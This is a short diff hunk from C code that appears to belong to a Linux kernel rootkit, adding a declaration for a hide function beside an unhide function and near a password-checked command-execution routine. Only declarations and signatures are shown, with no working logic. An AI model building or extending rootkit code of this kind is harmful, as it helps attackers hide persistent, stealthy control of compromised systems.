@@ -99,6 +99,7 @@ struct file_operations *get_fops(char *path) {
 }
 
 void cns_rootkit_unhide(void);
+void cns_rootkit_hide(void);
 
 void command_execute(char __user *buf, size_t count) {
   if(count <= sizeof(PASSWORD)) {
